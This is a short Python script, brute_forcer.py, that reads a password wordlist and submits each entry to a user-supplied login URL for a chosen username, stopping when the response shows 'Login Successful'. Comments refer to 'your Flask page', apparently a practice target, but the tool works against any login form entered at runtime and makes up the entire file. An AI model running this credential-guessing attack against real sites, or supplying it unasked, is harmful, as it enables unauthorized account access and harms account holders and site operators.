# brute_forcer.py
import requests
import os   # only std-lib modules; no pathlib

SUCCESS_MARKER = "Login Successful"      # <h1>Login Successful</h1> in your Flask page
FAIL_STATUS    = 401                     # Flask returns 401 on failure

def brute_force_login(url: str, username: str, password_list):
    """
    Try each password in password_list against the given url/username.
    Returns the first working password or None.
    """
    session = requests.Session()         # keep cookies (not strictly needed here)
    for password in password_list:
        password = password.strip()
        if not password:
            continue                     # skip blank lines

        try:
            resp = session.post(
                url,
                data={"username": username, "password": password},
                timeout=5,               # don’t hang forever
            )
        except requests.RequestException as exc:
            print(f"[!] Network error for password '{password}': {exc}")
            continue

        if resp.status_code != FAIL_STATUS and SUCCESS_MARKER in resp.text:
            print(f"[+] Success! Password found: {password}")
            return password
        else:
            print(f"[-] Tried '{password}' … failed")

    print("[×] Brute-force attempt finished — no valid password found.")
    return None


if __name__ == "__main__":
    url          = input("Enter the login URL: ").strip()
    username     = input("Enter the username: ").strip()
    password_file= input("Enter path to password list file: ").strip()

    if not os.path.isfile(password_file):
        print("[!] Password list file not found.")
        exit(1)

    with open(password_file, "r", encoding="utf-8", errors="ignore") as f:
        pw_list = f.readlines()

    brute_force_login(url, username, pw_list)
